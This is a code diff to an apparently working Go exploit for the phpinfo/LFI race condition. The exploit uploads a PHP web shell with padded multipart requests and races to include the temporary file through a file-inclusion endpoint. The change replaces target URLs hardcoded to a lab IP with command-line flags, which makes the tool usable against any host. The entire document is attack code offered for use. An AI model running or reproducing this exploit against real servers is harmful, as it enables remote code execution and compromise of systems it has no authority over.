@@ -13,37 +13,42 @@ import (
 	"sync"
 )
 
-const (
-	PHPINFO_URL = "http://10.10.176.70/dashboard/phpinfo.php"
-	LFI_URL     = "http://10.10.176.70/dev/index.html?view=%s"
-)
-
 var (
 	PADDING    = strings.Repeat("A", 5000)
 	host       string
 	port       string
 	requestStr string
 	proxyURL   string
+	phpinfoURL string
+	lfiURL     string
 )
 
 func main() {
 	flag.StringVar(&proxyURL, "proxy", "", "HTTP proxy URL (e.g., http://localhost:8080)")
+	flag.StringVar(&phpinfoURL, "phpinfo", "", "URL to phpinfo.php")
+	flag.StringVar(&lfiURL, "lfi", "", "URL to LFI endpoint (use %s as placeholder for file path)")
 	flag.Parse()
+
+	if phpinfoURL == "" || lfiURL == "" {
+		fmt.Println("Error: Both -phpinfo and -lfi arguments are required")
+		flag.Usage()
+		os.Exit(1)
+	}
 
 	payload, err := os.ReadFile("shell.php")
 	if err != nil {
 		panic(err)
 	}
 
-	phpinfoURL, err := url.Parse(PHPINFO_URL)
+	parsedPhpinfoURL, err := url.Parse(phpinfoURL)
 	if err != nil {
 		panic(err)
 	}
 
-	host = phpinfoURL.Hostname()
-	port = phpinfoURL.Port()
+	host = parsedPhpinfoURL.Hostname()
+	port = parsedPhpinfoURL.Port()
 	if port == "" {
-		switch phpinfoURL.Scheme {
+		switch parsedPhpinfoURL.Scheme {
 		case "http":
 			port = "80"
 		case "https":
@@ -63,7 +68,7 @@ func main() {
 	requestData.WriteString("-----------------------------7dbff1ded0714\r\n")
 	requestDataStr := requestData.String()
 
-	path := phpinfoURL.Path
+	path := parsedPhpinfoURL.Path
 	if path == "" {
 		path = "/"
 	}
@@ -77,7 +82,7 @@ func main() {
 		fmt.Sprintf("HTTP_PRAGMA: %s\r\n", PADDING),
 		"Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r\n",
 		fmt.Sprintf("Content-Length: %d\r\n", len(requestDataStr)),
-		fmt.Sprintf("Host: %s\r\n", phpinfoURL.Host),
+		fmt.Sprintf("Host: %s\r\n", parsedPhpinfoURL.Host),
 		"\r\n",
 	}
 
@@ -115,7 +120,7 @@ func main() {
 					}
 				}
 
-				resp, err := client.Get(fmt.Sprintf(LFI_URL, localTmpName))
+				resp, err := client.Get(fmt.Sprintf(lfiURL, localTmpName))
 				if err != nil {
 					panic(err)
 				}
@@ -134,13 +139,11 @@ func main() {
 		}()
 	}
 
-	// Wait in a separate goroutine
 	go func() {
 		wg.Wait()
 		close(resultChan)
 	}()
 
-	// Wait for success or all goroutines to finish
 	<-resultChan
 }
 
